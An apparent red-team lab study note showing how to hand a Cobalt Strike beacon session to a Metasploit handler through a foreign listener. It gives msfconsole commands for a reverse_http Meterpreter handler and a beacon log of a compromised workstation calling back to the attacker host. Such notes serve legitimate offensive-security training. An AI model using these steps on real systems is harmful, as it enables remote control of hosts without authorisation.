A `Foreign Listener` is essentially just passing a `Cobalt Strike` beacon session to a `Metasploit MSFconsole` session.


setup `msfconsole multi/handler` on `Attacker Linux` machine
```bash
attacker@ubuntu ~> sudo msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST ens5
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run

[*] Started HTTP reverse handler on http://10.10.5.50:8080
```
create a new `listener` on cobaltstrike
![[Pasted image 20231129144617.png]]
`spawn msf` on bfarmer `WKSTN-2` Initial Access machine
```bash
[11/29 19:37:27] beacon> spawn msf
[11/29 19:37:27] [*] Tasked beacon to spawn (x86) windows/foreign/reverse_http (10.10.5.50:8080)
[11/29 19:37:27] [+] host called home, sent: 863 bytes
```
*Two downsides to the foreign listener is that it only supports x86 staged payloads (no x64 or stageless).*

![[Pasted image 20231129144855.png]]